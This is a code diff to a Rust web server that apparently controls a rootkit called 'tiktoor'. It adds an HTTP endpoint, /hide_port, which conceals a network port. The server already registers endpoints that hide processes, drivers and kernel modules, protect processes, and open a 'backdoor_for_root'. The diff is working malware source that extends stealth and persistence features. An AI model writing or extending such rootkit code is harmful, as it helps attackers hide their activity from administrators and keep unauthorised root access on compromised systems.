@@ -16,11 +16,6 @@ struct Cli {
 }
 
 #[derive(Deserialize)]
-struct HideProcessParameter {
-    pid: u32,
-}
-
-#[derive(Deserialize)]
 struct HideDriverParameter {
     name: CString,
 }
@@ -29,6 +24,23 @@ struct HideDriverParameter {
 async fn hide_driver(parameter: web::Json<HideDriverParameter>) -> impl Responder {
     tiktoor_client::hide_driver(&parameter.name);
     HttpResponse::Ok()
+}
+
+#[derive(Deserialize)]
+struct HidePortParameter {
+    transmission_type: u8,
+    port: u16,
+}
+
+#[post("/hide_port")]
+async fn hide_port(parameter: web::Json<HidePortParameter>) -> impl Responder {
+    tiktoor_client::hide_port(parameter.transmission_type, parameter.port);
+    HttpResponse::Ok()
+}
+
+#[derive(Deserialize)]
+struct HideProcessParameter {
+    pid: u32,
 }
 
 #[post("/hide_process")]
@@ -74,6 +86,7 @@ async fn main() -> std::io::Result<()> {
             .service(hide_module)
             .service(unhide_module)
             .service(hide_driver)
+            .service(hide_port)
             .service(protect_process)
             .service(backdoor_for_root)
     })
